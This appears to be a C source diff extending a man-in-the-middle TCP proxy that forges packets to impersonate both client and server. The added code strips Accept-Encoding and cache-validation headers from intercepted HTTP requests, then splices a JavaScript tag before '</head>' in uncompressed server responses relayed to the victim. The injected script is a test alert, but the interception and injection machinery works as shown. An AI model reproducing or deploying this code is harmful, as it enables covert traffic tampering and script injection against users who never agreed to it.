@@ -27,9 +27,9 @@ struct tcp_state
 {
 #define TCP_BUF_SIZE            1024*1024
     unsigned char       send_buf[TCP_BUF_SIZE];
-    unsigned int        s_ptr;
+    unsigned int        s_idx;                  // send next index
     unsigned char       receive_buf[TCP_BUF_SIZE];
-    unsigned int        r_ptr;
+    unsigned int        r_idx;                  // receive next index
 
     unsigned int        here_buf_start_seq;     // send start record
     unsigned int        here_next_seq;          // send record
@@ -47,6 +47,8 @@ struct tcp_recorder
     unsigned int        cli_ip_ni32;
     unsigned short      cli_port_ni16;
     unsigned short      cli_mss;
+
+    int                 can_insert;
 
     struct tcp_state    fake_cli,       // connect to server
                         fake_ser;       // listen from client
@@ -171,8 +173,7 @@ set_tcp_hdr(struct _tcphdr  *tcp,
     if(    !tcp
         || !source
         || !dest
-        || !hdr_len
-        || !window)
+        || !hdr_len)
         return 0;
     if(hdr_len > 15*4) return 0;
 
@@ -389,6 +390,7 @@ tr_send_tcp_pkt(struct tcp_recorder *tr,
     unsigned short  src_port_ni16   = 0;
     unsigned int    seq             = 0;
     unsigned int    ack_seq         = 0;
+    unsigned short  window          = 0;
     unsigned int    ret             = 0;
 
     if(send_to_client)
@@ -399,6 +401,10 @@ tr_send_tcp_pkt(struct tcp_recorder *tr,
         src_port_ni16   = tr->ser_port_ni16;
         seq             = tr->fake_ser.here_next_seq;
         ack_seq         = tr->fake_ser.there_next_seq + ack_len;
+        window          = TCP_BUF_SIZE - tr->fake_ser.r_idx > 0xffff
+                            ? 0xffff
+                            : TCP_BUF_SIZE - tr->fake_ser.r_idx;
+        window          = window < tr->ser_mss ? 0 : window;
     }
     else
     {
@@ -408,6 +414,10 @@ tr_send_tcp_pkt(struct tcp_recorder *tr,
         src_port_ni16   = tr->cli_port_ni16;
         seq             = tr->fake_cli.here_next_seq;
         ack_seq         = tr->fake_cli.there_next_seq + ack_len;
+        window          = TCP_BUF_SIZE - tr->fake_cli.r_idx > 0xffff
+                            ? 0xffff
+                            : TCP_BUF_SIZE - tr->fake_cli.r_idx;
+        window          = window < tr->cli_mss ? 0 : window;
     }
 
     ret = send_tcp_pkt( dst_ip_ni32,
@@ -417,7 +427,7 @@ tr_send_tcp_pkt(struct tcp_recorder *tr,
                         seq,
                         ack_seq,
                         flags,
-                        65535,
+                        window,
                         tcp_payload,
                         pl_len,
                         0,
@@ -487,11 +497,52 @@ tr_send_fin_to_client(  struct tcp_recorder *tr,
 
 
 unsigned int
+tr_send_rst_to_client(  struct tcp_recorder *tr,
+                        unsigned int        ack_len)
+{
+    return tr_send_tcp_pkt(tr, true, 1, ack_len, __ack___|__rst___, 0, 0);
+}
+
+
+unsigned int
 tr_send_multi_tcp_pkt_to_client(struct tcp_recorder *tr,
                                 unsigned char       *payload,
                                 unsigned int        pl_len)
 {
     return tr_send_multi_tcp_pkt(tr, true, payload, pl_len);
+}
+
+
+unsigned int
+tr_send_ack_to_server(  struct tcp_recorder *tr,
+                        unsigned int        ack_len)
+{
+    return tr_send_tcp_pkt(tr, false, 0, ack_len, __ack___, 0, 0);
+}
+
+
+unsigned int
+tr_send_fin_to_server(  struct tcp_recorder *tr,
+                        unsigned int        ack_len)
+{
+    return tr_send_tcp_pkt(tr, false, 1, ack_len, __ack___|__fin___, 0, 0);
+}
+
+
+unsigned int
+tr_send_rst_to_server(  struct tcp_recorder *tr,
+                        unsigned int        ack_len)
+{
+    return tr_send_tcp_pkt(tr, false, 1, ack_len, __ack___|__rst___, 0, 0);
+}
+
+
+unsigned int
+tr_send_multi_tcp_pkt_to_server(struct tcp_recorder *tr,
+                                unsigned char       *payload,
+                                unsigned int        pl_len)
+{
+    return tr_send_multi_tcp_pkt(tr, false, payload, pl_len);
 }
 
 
@@ -528,15 +579,165 @@ tr_init_c2s(void *pi)
 
 
 unsigned int
+do_save_data(struct tcp_recorder *tr, unsigned char send_to_client, void *pi)
+{
+    if(!tr || !pi) return false;
+    unsigned int    tdl     = get_tcp_data_len(pi);
+    if(!tdl) return 0;
+
+    unsigned char   *buf        = 0;
+    unsigned int    *buf_idx    = 0;
+
+    if(send_to_client)
+    {
+        buf     = tr->fake_cli.receive_buf;
+        buf_idx = &(tr->fake_cli.r_idx);
+    }
+    else
+    {
+        buf     = tr->fake_ser.receive_buf;
+        buf_idx = &(tr->fake_ser.r_idx);
+    }
+
+    if(tdl + (*buf_idx) > TCP_BUF_SIZE) return false;
+    memcpy(buf+(*buf_idx), get_tcp_data_ptr(pi), tdl);
+    *buf_idx    = *buf_idx + tdl;
+
+    return true;
+}
+
+
+unsigned int
+save_data_from_client(struct tcp_recorder *tr, void *pi)
+{
+    return do_save_data(tr, false, pi);
+}
+
+
+unsigned int
+save_data_from_server(struct tcp_recorder *tr, void *pi)
+{
+    return do_save_data(tr, true, pi);
+}
+
+
+unsigned int
+next_ready_request_size(struct tcp_recorder *tr)
+{
+    if(!tr) return 0;
+
+    unsigned char   *receive    = tr->fake_ser.receive_buf;
+    unsigned int    r_idx       = tr->fake_ser.r_idx;
+    if(!receive || !r_idx) return 0;
+
+    unsigned char   *p  = strnstr(receive, "\r\n\r\n", r_idx);
+    if(!p) return 0;
+
+    return p - receive + 4;
+}
+
+
+unsigned int
+check_request_and_push_to_server(struct tcp_recorder *tr)
+{
+    unsigned int    size        = next_ready_request_size(tr);
+    if(!size) return 0;
+    unsigned char   *src        = tr->fake_ser.receive_buf;
+    unsigned int    *dst_idx    = &(tr->fake_cli.s_idx);
+    unsigned char   *dst        = tr->fake_cli.send_buf + (*dst_idx);
+
+    // send_buf is not enough
+    if(*dst_idx + size > TCP_BUF_SIZE) return 0;
+
+    // copy request to fake cli send buf
+    memcpy(dst, src, size);
+    memmove(src, src+size, TCP_BUF_SIZE-size);
+    tr->fake_ser.r_idx  -= size;
+    // _MESSAGE_OUT("%u\n%*s\n====\n", size, size, dst);
+
+    unsigned char   *p      = 0;
+    unsigned char   *pend   = 0;
+
+#if 1
+    // set accepting encoding none
+#define ACCEPT_ENCODING_TAG     "Accept-Encoding: "
+    p   = strnstr(dst, ACCEPT_ENCODING_TAG, size);
+    if(p)
+    {
+        unsigned int    tag_len = strlen(ACCEPT_ENCODING_TAG);
+        pend    = strnstr(p, "\r\n", size - (p - dst));
+        memmove(p + tag_len + 4, pend, size-(pend-dst));
+        memcpy(p + tag_len, "none", 4);
+        size -= pend - p - tag_len - 4;
+    }
+#endif
+
+#if 1
+    // delete if-modified-since line
+#define IF_MODIFIED_SINCE       "If-Modified-Since: "
+    p   = strnstr(dst, IF_MODIFIED_SINCE, size);
+    if(p)
+    {
+        unsigned int    tag_len = strlen(IF_MODIFIED_SINCE);
+        pend    = strnstr(p, "\r\n", size - (p - dst));
+        memmove(p, pend+2, size-(pend-dst));
+        size -= pend - p + 2;
+    }
+#endif
+
+#if 1
+    // delete if-none-match line
+#define IF_MODIFIED_SINCE       "If-None-Match: "
+    p   = strnstr(dst, IF_MODIFIED_SINCE, size);
+    if(p)
+    {
+        unsigned int    tag_len = strlen(IF_MODIFIED_SINCE);
+        pend    = strnstr(p, "\r\n", size - (p - dst));
+        memmove(p, pend+2, size-(pend-dst));
+        size -= pend - p + 2;
+    }
+#endif
+
+    // _MESSAGE_OUT("%u\n%.*s\n=====\n", size, size, dst);
+    *dst_idx    = *dst_idx + size;
+
+    tr_send_multi_tcp_pkt_to_server(tr, dst, size);
+    return size;
+}
+
+
+unsigned int
 do_tr_fake_server_receive(struct tcp_recorder *tr, void *pi)
 {
-    // if(get_tcp_hdr(pi)->fin)
-    //     tr_send_ack_to_client(tr, 1);
-    // else
-    //     tr_send_fin_to_client(tr, get_tcp_data_len(pi));
-    tr_send_ack_to_client(tr, get_tcp_data_len(pi));
-    unsigned char   p[1800]  = "HTTP/1.1 200 OK\r\nContent-Length: 1500\r\nContent-Type: text/html;charset=UTF-8\r\n\r\n<!DOCTYPE html>\r\n<html>\r\n<head>\r\n    <title>server_fuck_test</title>\r\n    </head>\r\n<body>\r\n<img src=\"http://i1.sinaimg.cn/IT/cr/2012/0618/941424605.png\">\r\n</body>\r\n</html>\r\n\r\n";
-    tr_send_multi_tcp_pkt_to_client(tr, p, 1800);
+    if(!tr || !pi) return false;
+    unsigned int    tdl     = get_tcp_data_len(pi);
+    struct _tcphdr  *tcp    = get_tcp_hdr(pi);
+    if(!tcp) return false;
+
+    // real client to us(fake server) data len means server max segment size
+    tr->ser_mss = (tdl > tr->ser_mss ? tdl : tr->ser_mss);
+
+    if(tcp->rst)
+    {
+        tr_send_rst_to_server(tr, 0);
+        return false;
+    }
+    // todo: fin opera, send data in send_buf
+    if(tcp->fin)
+    {
+        tr_send_ack_to_client(tr, 1);
+        tr_send_rst_to_client(tr, 0);
+        return false;
+    }
+
+    // ack & save
+    if(tdl)
+    {
+        tr_send_ack_to_client(tr, tdl);
+        save_data_from_client(tr, pi);
+    }
+
+    check_request_and_push_to_server(tr);
 
     return true;
 }
@@ -545,6 +746,81 @@ do_tr_fake_server_receive(struct tcp_recorder *tr, void *pi)
 unsigned int
 do_tr_fake_client_receive(struct tcp_recorder *tr, void *pi)
 {
+    if(!tr || !pi) return false;
+    unsigned int    tdl     = get_tcp_data_len(pi);
+    struct _tcphdr  *tcp    = get_tcp_hdr(pi);
+    if(!tcp) return false;
+    // real server to us(fake client) data len means client max segment size
+    tr->cli_mss = (tdl > tr->cli_mss ? tdl : tr->cli_mss);
+
+    if(tcp->rst)
+    {
+        tr_send_rst_to_client(tr, 0);
+        return false;
+    }
+
+    // todo: fin opera, send data in send_buf
+    if(tcp->fin)
+    {
+        tr_send_ack_to_server(tr, 1);
+        tr_send_rst_to_server(tr, 0);
+        return false;
+    }
+
+    // ack & save
+    if(tdl)
+    {
+        if(tcp->seq != _ntoh32(tr->fake_cli.there_next_seq))
+        {
+            tr_send_ack_to_server(tr, 0);
+            return true;
+        }
+
+        if(!tr->can_insert)
+        {
+            unsigned char   *http   = get_http_ptr(pi);
+            unsigned int    hdr_len = get_http_hdr_len(pi);
+            if(hdr_len)
+            {
+                if(!strnstr(http, "chunked\r\n", hdr_len)
+                    && !strnstr(http, "Content-Encoding: ", hdr_len))
+                {
+                    tr->can_insert  = 1;
+                }
+                else
+                    tr->can_insert  = -1;
+            }
+        }
+
+        tr_send_ack_to_server(tr, tdl);
+        save_data_from_server(tr, pi);
+        // test
+        unsigned char   *insert_js  = "<script type=\"text/javascript\">alert(\"erriy in\");</script>\r\n";
+        unsigned int    insert_size = strlen(insert_js);
+        unsigned char   *tar        = get_tcp_data_ptr(pi);
+        unsigned char   *pbuf       = malloc(insert_size + tdl + 1000);
+        memset(pbuf, 0, insert_size + tdl + 1000);
+        memcpy(pbuf, tar, tdl);
+
+        if(1 == tr->can_insert)
+        {
+            unsigned char   *p  = strnstr(pbuf, "</head>", tdl);
+            if(p)
+            {
+                memmove(p + insert_size, p, tdl-(p-pbuf));
+                // memmove(pbuf, pbuf + insert_size, tdl);
+                memcpy(p, insert_js, insert_size);
+                tdl += insert_size;
+                _MESSAGE_OUT("\n%s\n", pbuf);
+            }
+        }
+
+        tr_send_multi_tcp_pkt_to_client(tr, pbuf, tdl);
+        free(pbuf);
+    }
+
+    // check_response_and_push_to_client(tr);
+
     return true;
 }
 
